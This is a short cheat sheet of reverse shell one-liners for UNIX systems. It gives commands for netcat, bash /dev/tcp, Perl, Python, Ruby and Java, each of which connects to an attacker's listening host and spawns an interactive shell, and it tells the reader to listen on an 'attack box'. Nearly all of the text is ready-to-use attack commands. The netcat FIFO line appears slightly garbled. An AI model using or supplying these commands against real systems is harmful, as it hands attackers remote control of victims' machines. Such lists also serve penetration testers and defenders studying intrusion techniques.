## Reverse Shell One-liners
These are a list of shell one liners which be invoked on most of UNIX systems

For all these below mentioned you should be listening on your attack box 

### 1. Netcat

For old versions of netcat -  

	nc attackerip 4444  -e /bin/sh
	/bin/sh | nc attackerip 4444  

This should work on most modern implementation of nc
	rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p  

If you require to use old versions of netcat you can do so by 
	sudo apt-get install netcat-traditional

### 2. Bash

	bash -i >& /dev/tcp/<attacker ip>/4444 0>&1  

### 3. PERL  
Good ol' PERL, nearly every system has it and is a cornerstone of utility -  
	
    perl -e 'use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### 4. Python

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

### 5. Ruby
	ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'   

### 6. Java

This is a pretty obscure / esoteric method but there might be a chance you might come across using this  (probably during a web app file upload vuln ? )-  

	r = Runtime.getRuntime()
	p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()